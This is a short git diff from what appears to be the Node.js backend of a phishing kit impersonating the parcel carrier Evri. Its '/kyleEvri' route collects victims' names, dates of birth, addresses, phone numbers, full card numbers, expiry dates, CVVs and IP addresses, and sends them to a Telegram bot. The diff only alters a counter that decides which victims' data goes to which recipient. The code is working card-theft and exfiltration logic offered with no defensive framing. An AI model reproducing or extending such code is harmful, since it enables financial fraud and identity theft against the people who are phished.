@@ -6817,7 +6817,7 @@ app.post("/kyleEvri", (req, res) => {
     .then(function () {
       binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
       var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
-      if (symEvri == 5) {
+      if (kyle == 10) {
         axios
           .post(
             `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
@@ -6830,7 +6830,7 @@ app.post("/kyleEvri", (req, res) => {
           .catch((e) => {
             console.log(e);
           });
-        symEvri = 0;
+          kyle = 5;
       } else if (bin === "542011") {
         axios
           .post(
